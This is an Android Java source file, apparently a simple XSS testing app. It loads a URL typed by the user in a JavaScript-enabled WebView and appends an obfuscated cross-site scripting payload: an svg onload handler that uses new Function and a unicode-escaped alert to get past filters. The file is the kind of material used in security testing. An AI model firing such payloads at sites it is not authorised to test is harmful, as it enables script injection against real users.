package com.example.xsshunter;

import android.app.Activity;
import android.os.Bundle;

import android.view.View;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;

/* developed by ahmed othman
not forget to follow us
https://www.facebook.com/ahmed.othman.2121
https://www.linkedin.com/in/ahmedothman2121/
https://blackangel1.medium.com/
 */

public class MainActivity extends Activity  {
    Button b1;
    EditText ed1;

    private WebView wv1;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        b1=(Button)findViewById(R.id.button);
        ed1=(EditText)findViewById(R.id.editText);

        wv1=(WebView)findViewById(R.id.webView);
        wv1.setWebChromeClient(new WebChromeClient ());

        b1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String url = ed1.getText().toString();





                wv1.getSettings().setLoadsImagesAutomatically(true);
                wv1.getSettings().setJavaScriptEnabled(true);
                wv1.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
                wv1.loadUrl(url+"<svg onload='new Function`[\\\"XSS By AHMED\\\"].find(al\\\\u0065rt)`'>\\n\'");
            }
        });
    }

}